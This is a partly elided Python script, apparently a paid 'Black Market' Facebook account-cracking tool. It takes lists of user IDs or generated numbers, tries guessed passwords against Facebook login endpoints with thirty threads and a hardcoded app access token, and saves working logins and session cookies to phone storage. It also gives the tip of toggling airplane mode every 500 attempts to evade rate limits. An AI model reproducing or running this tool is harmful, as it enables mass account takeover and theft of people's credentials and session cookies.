~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  [\036•\033[1;32m] [Name]     : Yuji Greigor (BLACK MARKET)
  [\036•\033[1;32m] [Facebook] : https://www.facebook.com/Yuji.IAmLimitless
  [\036•\033[1;32m] [Tool]     : Premium
  [\036•\033[1;32m] [Network]  : All Network
  [\036•\033[1;32m] [Version]  : 1.1
\033[1;37m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  [•] ALIVE ACC/s SAVE IN:\033[1;32m /sdcard/YUJI-OK.txt\033[1;37m
  [•] DEAD ACC/s SAVE IN:\033[1;32m /sdcard/YUJI-CP.txt\033[1;37m
\033[1;37m----------------------------------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------------------------------')
print("")
r1=requests.get("https://raw.githubusercontent.com/JASPER052007/Yu-Ji/main/Approval.txt").text
if key1 in r1:
	os.system('clear')
print(logo)
print("\ \33[1;32m APPROVAL FIRST \33[1;37m ")
time.sleep(1)
os.system('clear')
print(logo)
print("")
print(" \033[1;32m YUJI GREIGOR [Black Market] \033[1;37m\n")
print(" \033[1;32m Note : THIS IS A PAID TOOL!   \033[1;37m")
print ("")
print(" [ Mode of Payment : GCASH ] ")
print("")
print(" key is not Approved. ")
print("")
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/yuji.txt  etc..')
				linex()
				...
				try:
					...
					ps_limit =1
				clear()
				print('\033[1;32m ex: first last,firstlast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' START CLONING? (y/n): ')
				linex()
				cx=input(' Choose: ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' Take Note: On Airplane Mode Every 500 Counts')
					linex()
					for user in fo:
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as YUJI:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					YUJI.submit(YUJI4,ids,passlist)
...
def gmail():
		...
		with tred(max_workers=30) as ZEESHU:
			...
			clear()
			print(' Total account ids : \033[1;32m'+total_ids+f' ')
			print('\033[1;32m On Airplane Mode Every 500 Counts')
			linex()
			for user in fo:
				ids,names = user.split('|')
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [YUJI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [YUJI-ALIVE] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/YUJI-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[1;32m [YUJI-ALIVE] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [YUJI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [YUJI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/YUJI-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/YUJI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ZEESHU-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def ZEESHU4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [YUJI-ZEESHU] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/Yuji-COOKIE.txt','a').write(coki+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;33m [Yuji-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Yuji-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
